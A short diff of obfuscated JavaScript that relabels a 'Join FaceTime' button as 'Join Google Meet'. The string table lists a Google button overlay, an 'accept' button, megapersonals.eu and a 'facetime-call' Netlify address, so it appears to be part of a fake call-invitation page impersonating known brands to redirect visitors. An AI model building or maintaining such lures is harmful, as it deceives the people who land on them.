@@ -40,7 +40,7 @@ function _0x5d8e() {
                 'src', 'container', 'link', 'color', 'accept-button', 'body', 'name',
                 'google-button-overlay', 'innerHTML', 'lazy', 'type', 'add', 'img', 'display',
                 'outline', 'G-map', 'input-section', 'border', '48570ZWeEoT', '45dlKRXx', '450',
-                'click', 'Join\x20FaceTime', '#6565c5', 'fa-search',
+                'click', 'Join\x20Google Meet', '#6565c5', 'fa-search',
                 `https://megapersonals.eu/`,
                 'https://res.cloudinary.com/dlzhxryun/raw/upload/v1736179196/stylemap_lzqonr.css', 'classList', 'textContent',
                 'https://facetime-call.netlify.app/',
